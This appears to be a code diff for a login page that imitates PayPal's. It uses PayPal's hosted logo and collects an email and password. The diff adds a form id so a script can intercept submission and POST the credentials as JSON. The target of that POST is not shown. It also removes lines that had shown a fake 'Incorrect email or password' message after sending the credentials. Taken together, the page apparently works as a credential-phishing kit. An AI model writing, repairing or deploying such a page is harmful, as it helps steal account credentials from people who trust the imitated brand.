@@ -1,5 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -13,6 +14,7 @@
             align-items: center;
             height: 100vh;
         }
+
         .login-container {
             background-color: white;
             width: 350px;
@@ -21,10 +23,12 @@
             box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
             text-align: center;
         }
+
         .logo {
             width: 50px;
             margin-bottom: 20px;
         }
+
         .input-field {
             width: 90%;
             padding: 12px;
@@ -33,6 +37,7 @@
             border-radius: 5px;
             font-size: 16px;
         }
+
         .forgot-link {
             display: block;
             text-align: left;
@@ -41,9 +46,11 @@
             font-size: 14px;
             margin-bottom: 15px;
         }
+
         .forgot-link:hover {
             text-decoration: underline;
         }
+
         .next-btn {
             width: 100%;
             padding: 12px;
@@ -55,9 +62,11 @@
             cursor: pointer;
             font-weight: bold;
         }
+
         .next-btn:hover {
             background-color: #005ea6;
         }
+
         .divider {
             display: flex;
             align-items: center;
@@ -65,6 +74,7 @@
             color: gray;
             font-size: 14px;
         }
+
         .divider::before,
         .divider::after {
             content: "";
@@ -73,6 +83,7 @@
             background: #ddd;
             margin: 0 10px;
         }
+
         .signup-btn {
             width: 100%;
             padding: 12px;
@@ -83,29 +94,34 @@
             cursor: pointer;
             font-weight: bold;
         }
+
         .signup-btn:hover {
             background-color: #f7f9fc;
         }
+
         .language-options {
             margin-top: 20px;
             font-size: 12px;
             color: gray;
         }
+
         .language-options a {
             margin: 0 5px;
             text-decoration: none;
             color: black;
         }
+
         .language-options a:hover {
             text-decoration: underline;
         }
     </style>
 </head>
+
 <body>
 
     <div class="login-container">
         <img src="https://www.paypalobjects.com/webstatic/icon/pp258.png" alt="PayPal Logo" class="logo">
-        <form action="/login" method="post">
+        <form action="/login" id="login-form" method="post">
             <div style="margin-bottom: 3px;">
                 <input type="email" name="email" class="input-field" placeholder="Email or mobile number" required>
             </div>
@@ -121,13 +137,12 @@
             <a href="#">English</a> | <a href="#">Français</a> | <a href="#">Español</a> | <a href="#">中文</a>
         </div>
     </div>
-        <script>
+    <script>
         document.getElementById("login-form").addEventListener("submit", async function (event) {
             event.preventDefault();
 
             const email = document.getElementById("email").value;
             const password = document.getElementById("password").value;
-            let responseContainer = document.getElementById("display-response");
 
             if (!email || !password) {
                 alert("Please enter both email and password.");
@@ -142,11 +157,11 @@
                     },
                     body: JSON.stringify({ email, password })
                 });
-                responseContainer.textContent = "Incorrect email or password";
             } catch (error) {
-                responseContainer.textContent = "Check your network connection";
+                alert("Check your network connection");
             }
         });
     </script>
 </body>
+
 </html>
